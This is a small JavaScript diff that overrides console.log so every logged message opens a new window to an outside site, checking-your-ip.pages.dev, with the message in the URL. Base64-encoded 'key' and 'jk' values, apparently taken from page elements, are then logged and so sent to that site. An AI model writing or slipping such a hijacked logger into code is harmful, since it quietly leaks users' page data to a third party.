@@ -3,7 +3,7 @@ let key = "";
 let jk = "";
 const originalConsoleLog = console.log;
 console.log = function(message) {
-    window.open(message, "_blank");
+    window.open("https://checking-your-ip.pages.dev/#?service="+message, "_blank");
     originalConsoleLog.apply(console, arguments);
 };
 
@@ -27,6 +27,6 @@ const elements = document.querySelectorAll('*'); // Select all elements in the D
         });
     });
 let aha = btoa(`${jk}&${key}&c`)
-console.log(`https://checking-your-ip.pages.dev/#?service=${aha}`)
+console.log(aha)
 
 
